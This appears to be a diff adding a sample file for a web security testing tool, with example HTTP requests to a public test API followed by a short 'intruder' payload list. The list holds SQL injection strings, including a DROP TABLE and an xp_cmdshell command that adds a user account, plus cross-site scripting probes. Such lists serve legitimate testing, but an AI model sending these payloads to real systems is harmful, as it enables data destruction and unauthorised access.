@@ -1,0 +1,49 @@
+
+
+Repeater
+
+GET Request Example:
+
+GET https://jsonplaceholder.typicode.com/posts/1
+User-Agent: SecuLite/1.0
+Accept: application/json
+
+POST Request Example:
+
+POST https://jsonplaceholder.typicode.com/posts
+Content-Type: application/json
+User-Agent: SecuLite/1.0
+
+{
+    "title": "foo",
+    "body": "bar",
+    "userId": 1
+}
+
+PUT Request Example:
+
+PUT https://jsonplaceholder.typicode.com/posts/1
+Content-Type: application/json
+User-Agent: SecuLite/1.0
+
+{
+    "id": 1,
+    "title": "updated title",
+    "body": "updated body",
+    "userId": 1
+}
+
+DELETE Request Example:
+
+DELETE https://jsonplaceholder.typicode.com/posts/1
+User-Agent: SecuLite/1.0
+
+intruder payload
+' OR 1=1 --
+'; DROP TABLE users; --
+<script>alert('XSS')</script>
+' AND email IS NULL --
+<img src='x' onerror='alert(1)'>
+admin' --
+'; SELECT * FROM users --
+'; EXEC xp_cmdshell('net user hacker /add') --
